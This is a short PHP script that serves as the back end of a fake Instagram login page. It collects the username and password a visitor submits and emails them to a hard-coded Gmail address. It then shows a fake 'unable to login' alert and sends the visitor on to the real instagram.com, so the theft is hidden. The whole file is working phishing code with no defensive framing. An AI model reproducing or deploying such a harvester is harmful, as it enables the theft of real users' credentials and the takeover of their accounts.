<?php

//varible setting
$username = $_POST['u_name'];  // fetch username
 $passcode = $_POST['pass'];  // fetch password
 $subject = "Someone Login ! Insta Dummy page";
 $to ="prodyumna9d@gmail.com";
 
 $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
 


// check input fields
if (empty($username)|| empty($passcode)){ // name or message
echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
    window.history.go(-1);
    </script>";
}
else 
{ 
    mail($to,$subject,$txt); // send an email 
    echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
     // Simulate an HTTP redirect:
    window.location.replace('http://www.instagram.com');
    </script>";
}


?>
